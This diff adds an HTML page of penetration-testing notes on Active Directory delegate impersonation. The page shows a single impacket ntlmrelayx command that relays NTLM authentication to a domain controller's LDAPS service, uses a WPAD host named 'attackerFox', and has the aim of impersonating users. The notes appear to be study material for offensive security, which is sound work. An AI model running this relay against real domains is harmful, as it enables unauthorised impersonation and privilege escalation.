@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>2. Delegate Impersonation</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
+</head>
+<body>
+<div class='page'><h1 class='title'>2. Delegate Impersonation</h1><br/>Add a new Computer and we can impersonate users on the target computer <br /><strong>Target LDAP Secure Service</strong><br /><div class="codebox"><pre>kali@kali<span style="color:#ff9d00;font-weight:700">:</span>$ <span style="color:#ff9d00;font-weight:700">cd</span> <span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>share<span style="color:#ff9d00;font-weight:700">/</span>doc<span style="color:#ff9d00;font-weight:700">/</span>python3-impacket<span style="color:#ff9d00;font-weight:700">/</span>examples<br />kali@kali<span style="color:#ff9d00;font-weight:700">:</span>$ python3 ntlmrelayx.py -wh attackerFox.daniele.local --target ldaps<span style="color:#ff9d00;font-weight:700">://</span>&lt;IpDomainController&gt; --no-smb-server</pre></div><br />OPTIONS:<br />    <a href=""><img src="images/1259-1.png" alt="images/1259-1.png" /></a><br />    <a href=""><img src="images/1259-2.png" alt="images/1259-2.png" /></a><br />    <a href=""><img src="images/1259-3.png" alt="images/1259-3.png" /></a><br /><br />OUTPUT:<br /><a href=""><img src="images/1259-4.png" alt="images/1259-4.png" /></a><br /><h3>    </h3><strong><h3>TO BE CONTINUED!!!</h3></strong><br /><br />Bibliography:<br />• <a href="https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/#:~:text=creating%20a%20new%20computer%20account%20and%20granting%20it%20delegation%20rights%20to%20the%20victim%20computer">The worst of both worlds: Combining NTLM Relaying and Kerberos delegation - dirkjanm.io</a></div>
+</body>
+</html>
